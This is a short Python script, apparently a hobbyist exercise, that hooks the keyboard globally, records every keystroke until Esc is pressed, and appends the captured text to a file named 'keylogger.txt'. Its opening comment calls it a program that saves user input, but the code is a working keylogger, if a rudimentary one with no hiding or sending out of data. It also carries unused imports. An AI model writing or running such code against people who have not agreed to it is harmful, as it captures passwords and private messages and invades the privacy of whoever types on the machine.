#This is a short program that saves user input to a file
import keyboard
import string
from playsound import playsound

#input from keyboard
from threading import Timer
from datetime import datetime
#timing/intervals
Collectible_Characters = list(string.printable + string.ascii_uppercase + string.whitespace)
buffer = ""
recorded_events = keyboard.record("esc")
for recorded_event in recorded_events:
    if(recorded_event.name == "space"):
        recorded_event.name = " "
    if(recorded_event.event_type == "down" and recorded_event.name in Collectible_Characters):
        buffer += recorded_event.name
   

with open("keylogger.txt", "a") as fd:
    fd.write(buffer)
    
print(buffer)

